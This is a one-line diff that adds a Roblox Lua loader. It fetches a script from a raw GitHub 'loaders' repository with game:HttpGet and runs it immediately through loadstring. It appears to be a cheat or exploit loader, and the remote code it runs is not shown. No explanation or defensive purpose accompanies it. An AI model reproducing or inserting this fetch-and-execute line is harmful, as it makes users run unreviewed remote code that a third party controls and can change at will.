@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/heisei-mothra-kaiju-alpha-spam6-slcde00hfbwv9d.lua"))()
